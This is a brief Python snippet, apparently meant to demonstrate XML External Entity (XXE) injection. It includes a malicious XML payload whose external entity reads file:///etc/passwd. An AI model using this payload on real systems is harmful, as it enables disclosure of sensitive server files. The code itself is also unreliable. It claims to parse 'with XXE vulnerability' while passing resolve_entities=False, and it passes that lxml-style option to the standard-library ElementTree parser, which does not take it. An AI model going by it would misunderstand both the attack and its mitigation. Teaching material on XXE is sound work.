# XML External Entity (XXE) Injection
#XXE Injection occurs when untrusted XML input is processed without proper validation, allowing attackers to access sensitive files.
import xml.etree.ElementTree as ET

def xxe_injection(xml_data):
    try:
        #   Parse XML data with XXE vulnerability
        parser = ET.XMLParser(resolve_entities=False)
        tree = ET.ElementTree(ET.fromstring(xml_data, parser=parser))
        root = tree.getroot()
        print("XML Parsed Successfully:", root)
    except Exception as e:
        print(f"Error parsing XML: {str(e)}")

# Malicious XML input with external entity to access sensitive file
malicious_xml = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""  #  XXE vulnerability exploited
xxe_injection(malicious_xml)
